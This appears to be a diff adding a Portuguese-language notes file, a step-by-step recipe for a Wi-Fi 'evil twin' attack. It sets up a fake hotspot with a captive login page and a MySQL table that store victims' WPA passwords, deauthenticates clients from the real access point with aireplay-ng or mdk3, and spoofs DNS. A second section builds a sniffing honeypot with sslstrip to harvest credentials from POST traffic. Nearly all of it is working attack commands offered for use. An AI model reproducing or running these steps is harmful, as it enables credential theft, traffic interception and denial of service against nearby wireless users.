@@ -1,0 +1,97 @@
+Evil twin para obter login ou senha WPA, sem prover acesso a internet: fake hotspot que redireciona para página de inserção de dados.
+
+1.Configurar servidor DHCP:
+--no arq.(/etc/default/dhcp3-server ou isc-dhcp-server) coloque no parâmetro INTERFACE at0
+--no arq.(/etc/dhcp3/dhcpd.conf ou /etc/dhcp/dhcpd.conf) insira uma config de rede:
+	ddns-update-style none;
+	default-lease-time 600;
+	max-lease-time 7200;
+	authoritative;
+	subnet 192.168.0.0 netmask 255.255.255.0 {
+		option subnet-mask 255.255.255.0;
+		option broadcast-address 192.168.0.255;
+		option routers 192.168.0.1;
+		option domain-name-servers 8.8.8.8;
+		range 192.168.0.2 192.168.2.10;
+	}
+
+2.Configurar página apache:
+--coloque a página(index.html) de login em /var/www/
+
+3.Cofigurar MySQL server para receber o login/senha:
+*Caso o login root não esteja registrado: 
+*/etc/init.d/mysql stop
+*Deixe em um terminal o comando rodando: mysqld_safe --skip-grant-tables
+*mysql;
+*use mysql;
+*update user set password=PASSWORD("root") where User='root';
+*flush privileges;
+*quit;
+*Dê Control+C no terminal anterior e depois: /etc/init.d/mysql stop
+
+--/etc/init.d/mysql start
+--mysql -u root -p  *insira a senha de root toor
+--create database wpa2;
+--use wpa2;
+--create table content(key1 VARCHAR(64),Key2 VARCHAR(64));
+--quit
+
+4.Ativar o fake hotspot e serviços:
+--airmon-ng wlan0  ou  iwconfig wlan0 mode monitor
+--airbase-ng -e "ESSID" -a BSSID -c 1 -vv wlan0
+--ifconfig at0 192.168.0.1 netmask 255.255.255.0 up
+--route add -net 192.168.0.0 netmask 255.255.255.0 gw 192.168.0.1
+--/etc/init.d/isc-dhcp-server start at0  (ou dhcpd3 -cf /etc/dhcp3/dhcpd.conf -pf /var/run/dhcp3-server/dhcpd.pid e /etc/init.d/dhcp3-server start)
+--/etc/init.d/apache2 start
+--start mysql
+--(echo "* A 192.168.0.1" > /usr/local/share/ettercap/etter.dns  e  ettercap -Tqi at0 -P dns_spoof)  ou  dnsspoof -i at0
+
+**Caso não queira dnsspooing, pode-se configurar o Iptables para rotear a internet e redirecionar:
+Exclusão das regras anteriores:
+--iptables -F
+--iptables -t nat -F
+--iptables --delete-chain
+--iptables -t nat --delete-chain
+Configuração do roteamento NAT: (hotspot|at0|>>>>>>>tunelNAT>>>>>>internet|eth0/wlan0|)
+--iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
+--iptables -A FORWARD -i at0 -j ACCEPT
+--echo 1 > /proc/sys/net/ipv4/ip_forward
+Redirecionamento:
+--iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.0.1:80
+--iptables -t nat -A POSTROUTING -j MASQUERADE
+
+**Para que os clientes do hotspot original possam se conectar ao falso:
+--aireplay-ng -0 0 -a <BSSIDap> -c <MAC cliente> wlan0  ou  aireplay-ng -0 0 -a <BSSID> wlan0
+--ou use o mdk3: mdk3 mon0 d -b <BSSIDap> -c <canalAP>
+
+**Quando um cliente se conectar, para verificar o login informado:
+--mysql -u root -p  *senha do root
+*show databases              //Mostra os bancos criados
+--use wpa2;
+*show tables;                //Mostra as tableas no banco
+*DESCRIBE tabela;            //Descreve uma tabela
+--select * from content;
+*delete database nomeBanco;  //Deleta um banco de dados
+*delete table nomeTabela;    //Deleta tabela
+*truncate table nomeTabela;  //Limpa uma tabela
+DELETE FROM nomeTabela WHERE nomeColuna=texto;  //Deleta um elemento específico de uma tabela
+
+
+______________________________________________________________________________________________________
+Honeypot para sniffar tráfego provendo acesso a internet:
+
+1. Configurar DHCP server para fornecer como getway o IP que será do hotspot e DNS funcional.
+2. Iniciar o hotspot:
+--airbase-ng -e "ESSID" wlan0
+3. Configurar interface do hotspot e iniciar DHCP:
+--ifconfig at0 <IP_hotspot> netmask <mascara> up
+--/etc/init.d/isc-dhcp-server start at0  (ou dhcpd3 -cf /etc/dhcp3/dhcpd.conf -pf /var/run/dhcp3-server/dhcpd.pid e /etc/init.d/dhcp3-server start)
+4. Configurar IPtables para compartilhar conexão cabeada por NAT:
+--iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
+--iptables -A FORWARD -i at0 -j ACCEPT
+--echo 1 > /proc/sys/net/ipv4/ip_forward
+5. Configurar SSLstrip:
+--iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
+--sslstrip -w log.txt -a -l 8080
+
+*Todo o tráfego será logado no arquivo. Filtra-o com a expressão "POST".
